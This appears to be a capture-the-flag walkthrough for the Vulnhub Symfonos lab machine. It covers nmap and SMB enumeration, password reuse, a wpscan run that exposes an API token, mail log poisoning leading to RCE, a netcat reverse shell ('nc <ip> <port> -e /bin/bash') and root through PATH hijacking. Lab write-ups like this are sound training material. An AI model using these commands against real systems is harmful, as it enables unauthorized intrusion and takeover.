run command : **sudo nmap -sC -sV -T4 -sS  -vv 192.168.1.8**

Result : 

<img width="952" alt="image" src="https://github.com/psfauzi/Vulnhub_Like_OSCP/assets/49013900/09f34bbd-70c0-45c5-ae76-728fd7db20a8">
<img width="863" alt="image" src="https://github.com/psfauzi/Vulnhub_Like_OSCP/assets/49013900/6db26bbf-1ff5-4e77-acc1-39048ac02536">



run command : **smbclient -L //192.168.1.8/ -N**

<img width="489" alt="image" src="https://github.com/psfauzi/Vulnhub_Like_OSCP/assets/49013900/94a580fd-ee1f-4b5b-b3cc-22b345af06dc">


Login with smbclinet : **smbclient \\\\192.168.1.8\\anonymous

<img width="469" alt="image" src="https://github.com/psfauzi/Vulnhub_Like_OSCP/assets/49013900/b7d0a191-9a7c-4898-92de-866840ff909f">

download attention.txt with command : **get attention.txt**

<img width="465" alt="image" src="https://github.com/psfauzi/Vulnhub_Like_OSCP/assets/49013900/af55aa88-df91-40a1-89e9-e71e96c6842f">

<img width="390" alt="image" src="https://github.com/psfauzi/Vulnhub_Like_OSCP/assets/49013900/11bb251f-aee9-4237-b981-290e5c3775fc">

we will get 3 password : **epidioko, qwerty, baseball**

try login to helios smb with those password.

command : **smbclient  //192.168.1.8/helios -U helios%qwerty**

<img width="410" alt="image" src="https://github.com/psfauzi/Vulnhub_Like_OSCP/assets/49013900/37883c40-bab6-45af-a76f-4cfb7da681bd">

wi will get 2 file txt: research.txt, todo.txt

<img width="948" alt="image" src="https://github.com/psfauzi/Vulnhub_Like_OSCP/assets/49013900/2907308b-2035-448f-804c-61f6934dd1ea">

for todo.txt , we will find interesting string which is : /h3l105

try to accessing on the we browser including url : http://192.168.1.8/h3l105

<img width="857" alt="image" src="https://github.com/psfauzi/Vulnhub_Like_OSCP/assets/49013900/8dba9348-3309-4e2b-a21d-2d79793f7212">

we have identify that the application using wordpress cms, so as usual we will try to scan with wpscan.

command : **wpscan -e ap --url http://symfonos.local/h3l105 --api-token bxONVr2ra2VUz6E3cZ9pBlEqCsFIZKTFSqvJlgQb1N4**

<img width="521" alt="image" src="https://github.com/psfauzi/Vulnhub_Like_OSCP/assets/49013900/0e3c2ac7-49e1-4386-a76d-0d67b4cd6a50">

found interesting vulnerabillity 

<img width="951" alt="image" src="https://github.com/psfauzi/Vulnhub_Like_OSCP/assets/49013900/06da6d6f-291a-4558-9d70-d45879f94994">



try to exploiting smtp

atfirst call to /var/mail/helios and follow step below:

<img width="636" alt="image" src="https://github.com/psfauzi/Vulnhub_Like_OSCP/assets/49013900/f277acc0-505f-4828-beda-c332fb68b323">

Success escalate to RCE 

<img width="958" alt="image" src="https://github.com/psfauzi/Vulnhub_Like_OSCP/assets/49013900/06254711-373f-45b6-a943-31fbdff57f8c">

Time to get intractive shell

command attacker : nc -lnvp 4242
command victim : nc <ip> <port> -e /bin/bash
  
<img width="956" alt="image" src="https://github.com/psfauzi/Vulnhub_Like_OSCP/assets/49013900/46ce5536-1eaa-4cb0-b65b-59e346cbe729">

<img width="432" alt="image" src="https://github.com/psfauzi/Vulnhub_Like_OSCP/assets/49013900/c8246476-0add-4569-b1a7-2a4be8afbb3a">

found interesting binary

<img width="490" alt="image" src="https://github.com/psfauzi/Vulnhub_Like_OSCP/assets/49013900/3f4677a1-449b-4ce0-9026-3a6ccdc8ce2b">
  
trying to modify path variables for /opt/statuscheck (looks like curl binary)

<img width="447" alt="image" src="https://github.com/psfauzi/Vulnhub_Like_OSCP/assets/49013900/633651a6-3516-417f-9213-1703e6f3f7d5">

  
Success Rooting
  
<img width="520" alt="image" src="https://github.com/psfauzi/Vulnhub_Like_OSCP/assets/49013900/c7c71c48-c053-430c-938b-bd4b3e5ac1e3">

<img width="787" alt="image" src="https://github.com/psfauzi/Vulnhub_Like_OSCP/assets/49013900/bdbe4b2f-3e87-408b-bc6e-df2355eeb76e">




